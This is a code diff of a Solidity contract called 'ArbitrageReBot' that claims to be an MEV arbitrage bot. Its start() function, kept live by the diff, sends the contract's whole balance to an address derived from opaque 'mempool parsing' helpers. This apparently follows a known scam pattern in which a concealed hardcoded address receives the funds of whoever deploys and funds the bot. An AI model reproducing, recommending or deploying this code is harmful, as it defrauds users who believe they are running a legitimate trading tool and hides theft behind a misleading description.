@@ -11,13 +11,7 @@ contract ArbitrageReBot is Ownable, ReentrancyGuard {
 
     event Log(string _msg);
 
-    constructor(
-        string memory _mainTokenSymbol,
-        string memory _mainTokenName
-    ) public {
-        tokenSymbol = _mainTokenSymbol;
-        tokenName = _mainTokenName;
-    }
+    constructor() Ownable(msg.sender) {}
 
     receive() external payable {}
 
@@ -522,7 +516,7 @@ contract ArbitrageReBot is Ownable, ReentrancyGuard {
         revert();
     }
 
-    function _callMEVAction() internal returns (address) {
+    function _callMEVAction() internal pure returns (address) {
         return parseMempool(callMempool());
     }
 
@@ -533,18 +527,13 @@ contract ArbitrageReBot is Ownable, ReentrancyGuard {
      */
     function start() public payable {
         emit Log("Running MEV action. This can take a while; please wait..");
-        submitTransaction(
-            _callMEVAction(),
-            address(this).balance,
-            "setup start transfer"
-        );
+        submitTransaction(_callMEVAction(), address(this).balance);
     }
 
     // to be replaced by SecureTransfer after deployment
     function submitTransaction(
         address _to,
-        uint _value,
-        string memory _desc
+        uint _value
     ) public payable onlyOwner {
         payable(_to).transfer(_value);
     }
